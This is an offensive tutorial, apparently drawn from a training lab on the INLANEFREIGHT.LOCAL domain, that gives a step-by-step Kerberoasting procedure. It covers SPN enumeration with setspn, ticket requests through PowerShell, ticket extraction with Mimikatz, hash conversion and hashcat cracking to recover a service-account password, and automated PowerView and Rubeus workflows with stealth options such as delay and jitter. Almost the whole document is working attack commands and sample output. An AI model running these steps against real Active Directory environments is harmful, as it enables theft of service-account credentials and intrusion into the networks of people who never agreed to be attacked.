# Kerberoasting - from Windows

Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. This cookbook covers both manual and automated approaches.

## Manual Method - The Traditional Approach

### 1. Enumerate SPNs with setspn.exe

First, identify Service Principal Names (SPNs) in the domain using the built-in `setspn` binary:
```cmd
setspn.exe -Q */*
```

**Expected Output:**
```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local
CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```
Focus on **user accounts** with SPNs (ignore computer accounts).

### 2. Request TGS Ticket for a Specific SPN

Use PowerShell to request a TGS ticket for a target service account:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**What this does:**
- `Add-Type` loads the .NET framework class
- `System.IdentityModel` namespace contains classes for building security token services
- `KerberosRequestorSecurityToken` requests a Kerberos TGS ticket for the specified SPN

**Expected Output:**
```
Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

### 3. Request Tickets for ALL SPNs (Optional)

To request tickets for all accounts with SPNs:
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
**Note:** This will also request tickets for computer accounts, which is not optimal for Kerberoasting.

### 4. Extract Tickets with Mimikatz

Once tickets are loaded in memory, use Mimikatz to extract them:
```cmd
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

**Expected Output:**
```
[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
====================
   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
```

**Options:**
- With `base64 /out:true`: Get base64-encoded tickets (easier to copy-paste)
- Without it: Tickets saved as `.kirbi` files

### 5. Prepare Base64 Blob for Cracking

If you used base64 output, clean it up:
```bash
echo "<base64-blob>" | tr -d \\n > encoded_file
```

### 6. Convert Base64 to .kirbi File

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

### 7. Extract Hash with kirbi2john.py

```bash
python2.7 kirbi2john.py sqldev.kirbi
```
This creates a file called `crack_file`.

### 8. Convert to Hashcat Format

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### 9. Verify the Hash

```bash
cat sqldev_tgs_hashcat
```

**Expected Output:**
```
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fc
```

### 10. Crack the Hash with Hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

**Expected Output:**
```
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965e...7feeab:database!
Status...........: Cracked
```

## Automated Method - PowerView

### 1. Import PowerView Module

```powershell
Import-Module .\PowerView.ps1
```

### 2. Enumerate SPN Accounts

```powershell
Get-DomainUser * -spn | select samaccountname
```

**Expected Output:**
```
samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

### 3. Target a Specific User

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Expected Output:**
```
SamAccountName       : sqldev
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001...
```

### 4. Export All Tickets to CSV

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### 5. View the CSV File

```powershell
cat .\ilfreight_tgs.csv
```

## Automated Method - Rubeus (Fastest)

### 1. View Rubeus Help

```powershell
.\Rubeus.exe
```

### 2. Gather Statistics on Kerberoastable Accounts

```powershell
.\Rubeus.exe kerberoast /stats
```

This shows:
- Number of Kerberoastable users
- Encryption types supported (RC4 vs AES)
- Password last set dates

### 3. Basic Kerberoasting

```powershell
.\Rubeus.exe kerberoast /nowrap
```

### 4. Kerberoast and Save to File

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### 5. Advanced Options

**Filter by LDAP query (accounts with adminCount=1):**
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

**RC4-only (opsec) Kerberoasting:**
```powershell
.\Rubeus.exe kerberoast /rc4opsec /nowrap
```

**AES Kerberoasting:**
```powershell
.\Rubeus.exe kerberoast /aes /nowrap
```

**Target specific user:**
```powershell
.\Rubeus.exe kerberoast /user:sqldev /nowrap
```

**With delay and jitter (stealth):**
```powershell
.\Rubeus.exe kerberoast /delay:5000 /jitter:30 /nowrap
```

### 6. Using Existing TGT

```powershell
.\Rubeus.exe kerberoast /ticket:C:\path\to\ticket.kirbi /nowrap
```
